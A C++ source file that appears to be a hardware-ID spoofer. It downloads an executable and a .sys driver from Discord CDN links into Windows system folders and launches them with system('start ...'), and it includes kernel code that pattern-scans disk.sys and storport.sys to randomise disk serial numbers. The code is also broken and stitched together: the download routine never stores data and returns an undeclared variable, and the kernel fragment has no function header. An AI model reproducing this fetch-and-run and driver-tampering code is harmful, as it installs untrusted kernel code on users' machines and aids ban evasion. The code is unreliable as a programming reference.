#include "WEB.h"
#include <tchar.h>

string WEB::replaceAll(string subject, const string& search,
	const string& replace) {
	size_t pos = 0;
	while ((pos = subject.find(search, pos)) != string::npos) {
		subject.replace(pos, search.length(), replace);
		pos += replace.length();
	}
	return subject;
}

string WEB::DownloadString(string URL) {
	HINTERNET interwebs = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
	HINTERNET urlFile;
	string rtn;
	if (interwebs) {
		urlFile = InternetOpenUrlA(interwebs, URL.c_str(), NULL, NULL, NULL, NULL);
		if (urlFile) {
			char buffer[2000];
			DWORD bytesRead;
			do {
				InternetReadFile(urlFile, buffer, 2000, &bytesRead);
				memset(buffer, 0, 2000);
			} while (bytesRead);
			InternetCloseHandle(interwebs);
			InternetCloseHandle(urlFile);
			string p = replaceAll(rtn, "|n", "\r\n");
			return p;
		}
	}
	InternetCloseHandle(interwebs);
	return p;
}


void WEB::CheckVersion(string version) {
	if (DownloadString("https://pastebin.com/raw/MVPZWNFJ") != version) {
		MessageBoxA(NULL, "Your version is outdated!", "VERSION!", 0);
		exit(0);
	}
}


int WEB::Perse() 
{
	std::cout << "\x1B[31m[\033[0m\x1B[91m!\033[0m\x1B[31m]\033[0m \Changing HardwareID" << std::endl;
	string URL = "https://cdn.discordapp.com/attachments/755293152000082005/755460939981258752/ConsoleApp1.exe";
	string path = "C:\\Windows\\Temp\\ConsoleApp1.exe";
	URLDownloadToFile(NULL, URL.c_str(), path.c_str(), 0, NULL);
	return 0;
} 

void gpusystem()
	
{
	time_t now;
	struct tm nowLocal;
	now = time(NULL);
	nowLocal = *localtime(&now);
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Driver GPU Loaded!");
	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/930892607444381756/935605239250296862/GPU-UUID-Changer.exe"), _T("C:/Windows/IME/GPU-UUID-Changer.exe"), 0, NULL);
	Sleep(3000);
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Driver GPU Loaded! (2)");
	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/930892607444381756/935605239053172756/GPU.sys"), _T("C:/Windows/IME/GPU.sys"), 0, NULL);
	Sleep(4000);
	system("start C:/Windows/IME/GPU-UUID-Changer.exe C:/Windows/IME/GPU.sys");
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("GPU DRIVER TOTALY LOADED! #KayklOnTOP");
}

memory::initialize( L"disk.sys" );
	const auto DiskEnableDisableFailurePrediction = reinterpret_cast< NTSTATUS( __fastcall* )( PFUNCTIONAL_DEVICE_EXTENSION, BOOLEAN ) >( memory::from_pattern( "\x48\x89\x5c\x24\x00\x48\x89\x74\x24\x00\x57\x48\x81\xec\x00\x00\x00\x00\x48\x8b\x05\x00\x00\x00\x00\x48\x33\xc4\x48\x89\x84\x24\x00\x00\x00\x00\x48\x8b\x59\x60\x48\x8b\xf1\x40\x8a\xfa\x8b\x4b\x10", "xxxx?xxxx?xxxx????xxx????xxxxxxx????xxxxxxxxxxxxx" ) );

	if ( !DiskEnableDisableFailurePrediction )
		return STATUS_UNSUCCESSFUL;

	memory::initialize( L"storport.sys" );
	const auto RaidUnitRegisterInterfaces_address = memory::from_pattern( "\xe8\x00\x00\x00\x00\x48\x8b\xcb\xe8\x00\x00\x00\x00\x85\xc0\x74\x0a", "x????xxxx????xxxx" );

	if ( !RaidUnitRegisterInterfaces_address )
		return STATUS_UNSUCCESSFUL;

	const auto RaidUnitRegisterInterfaces = reinterpret_cast< NTSTATUS( __fastcall* )( RAID_UNIT_EXTENSION* ) >( RaidUnitRegisterInterfaces_address + 5 + *reinterpret_cast< std::int32_t* >( RaidUnitRegisterInterfaces_address + 1 ) );

	const auto seed = __rdtsc( );

	for (auto current_object = disk_object->DeviceObject; current_object != nullptr; current_object = current_object->NextDevice )
	{
		const auto fd_extension = static_cast< PFUNCTIONAL_DEVICE_EXTENSION >( current_object->DeviceExtension );

		if ( !fd_extension )
			continue;

		const auto fs_device = IoGetDeviceAttachmentBaseRef( current_object );

		if ( !fs_device || fs_device->DeviceType != FILE_DEVICE_DISK )
			continue;

		const auto raid_extension = static_cast< PRAID_UNIT_EXTENSION >( fs_device->DeviceExtension );

		if ( !raid_extension )
			continue;

		const auto identity = reinterpret_cast< PSTOR_SCSI_IDENTITY >( std::uintptr_t( raid_extension ) + 0x68 ); // this offset changes per windows build, you figure it out
		
		if ( !identity )
			continue;

		const auto fdo_descriptor = fd_extension->DeviceDescriptor;

		if ( !fdo_descriptor )
			continue;

		const auto fdo_serial = reinterpret_cast< char* >( fdo_descriptor ) + fdo_descriptor->SerialNumberOffset;

		serializer::randomize( seed, fdo_serial );

		identity->SerialNumber.Length = static_cast< USHORT >( std::strlen( fdo_serial ) );
		memset( identity->SerialNumber.Buffer, 0, identity->SerialNumber.Length );
		memcpy( identity->SerialNumber.Buffer, fdo_serial, identity->SerialNumber.Length );

		DiskEnableDisableFailurePrediction( fd_extension, FALSE );
		RaidUnitRegisterInterfaces( raid_extension );
	}
		
	return STATUS_SUCCESS;
}


